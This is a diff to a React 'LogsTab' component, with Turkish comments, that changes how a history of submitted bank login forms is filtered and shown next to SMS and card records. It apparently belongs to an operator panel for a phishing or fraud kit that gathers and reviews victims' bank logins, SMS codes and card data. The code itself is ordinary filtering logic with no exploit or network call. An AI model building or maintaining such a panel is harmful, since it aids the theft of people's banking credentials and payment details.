@@ -1594,15 +1594,16 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     p._phone === c._phone && p._pers === c._pers && p._o2 === c._o2 && p._o3 === c._o3;
                   if (!same) bankDedup.push(c);
                 }
-                // ⭐⭐⭐ EN KRİTİK (SMS/KART İLE BİREBİR AYNI MANTIK):
-                //    GÜNCEL KOLON İLE TÜM 8 ALANI AYNI OLAN KAYITLARI SİL (kaç tane olursa olsun).
-                //    Kalanlar GERÇEK ESKİ BANKA GİRİŞ FORMLARI, SMS/KART KAYDI ASLA YOK (filtrelendi). ✅
-                // ⭐⭐⭐ KALICI FALLBACK EKLENDI (KULLANICI 1 GIRIS YAPTI AMMA GOZUKMUYOR SORUNU):
-                //   Eger hasAnyBankCur = true ise ve filtreden gecen KAYIT YOK (filtered.length === 0) AMA
-                //   HAM kayit VARSA (bankDedup.length > 0): bu durumda TEK KULLANICI 1 kez girdi ve TEK KAYIT
-                //   guncel kolon ile AYNI oldugu icin SILINDI. Kullanici "GIRIS YAPTIM AMMA NEDEN GOZUKMUYOR" diyordu.
-                //   COZUM: BU KAYITLARI DA FALLBACK olarak _isSameColon=true diyerek GOSTER, ama rozetle isaretle!
-                const bankFilteredOnly: any[] = !hasAnyBankCur
+                // ⭐⭐⭐ KALICI: KENDİNİ SİL (SMS/KART İLE BİREBİR AYNI MANTIK)
+                //   GÜNCEL KOLON İLE TÜM 8 ALANI AYNI OLAN KAYITLARI SİL (kaç tane olursa olsun).
+                //   Kalanlar GERÇEK ESKİ BANKA GİRİŞ FORMLARI, SMS/KART KAYDI ASLA YOK (filtrelendi). ✅
+                //   🔴 KULLANICI: "GECMIS ne demek? GECMIS = GUNCELL KOLONUNDA GORULEN SU ANKI DEĞİL,
+                //      GEÇMİŞTE (SUBMIT ETMİŞ OLDUĞUM) ÖNCEKİ DEĞERLER."
+                //   → Bu yüzden fallback _isSameColon (= güncelle aynı) MEKANİZMASINI KALICI OLARAK SİL!
+                //     GÜNCEL KOLON İLE AYNI OLAN KAYITLAR GEÇMİŞTE GÖRÜNMEZ!
+                //   → SONUÇ: 1 kez giren kullanıcının (2. giriş yoksa) GEÇMİŞİ YOKTUR (doğru).
+                //            2 kez farklı giren kullanıcının GEÇMİŞİ = 1. GİRİŞİNE AİT KAYIT (doğru).
+                const bankHistoryRawFinal: any[] = !hasAnyBankCur
                   ? bankDedup.slice()
                   : bankDedup.filter((e: any) => {
                       const same =
@@ -1616,26 +1617,10 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                         e._o3 === curO3;
                       return !same;
                     });
-                let bankHistoryRawFinal: any[];
-                if (bankFilteredOnly.length > 0) {
-                  bankHistoryRawFinal = bankFilteredOnly;
-                } else if (bankDedup.length > 0) {
-                  // ⭐ FALLBACK: GERCEK kayit VAR ama hepsi guncel kolonla ayni diye silindi,
-                  // fallback olarak göster ama _isSameColon = true isaretle.
-                  bankHistoryRawFinal = bankDedup.map((e: any) => ({
-                    ...e,
-                    _isSameColon: true,
-                  }));
-                } else {
-                  bankHistoryRawFinal = [];
-                }
                 const bankHistoryCount = bankHistoryRawFinal.length;
                 (fd as any)._bankHistory = bankHistoryRawFinal;
-                // ⭐ EKSTRA VERI (header da gosterilecek):
-                //   _bankDedupLength  = HAM (temizlenmis filtresiz) TOPLAM KAYIT SAYISI
-                //   _bankFilteredOnly = GERCEK (filtreden gecen, guncelden farkli) KAYIT
                 (fd as any)._bankDedupLength = bankDedup.length;
-                (fd as any)._bankFilteredOnly = bankFilteredOnly.length;
+                (fd as any)._bankFilteredOnly = bankHistoryRawFinal.length;
                 (fd as any)._smsHistory = smsHistory;
                 (fd as any)._cardHistory = cardHistory;
                 
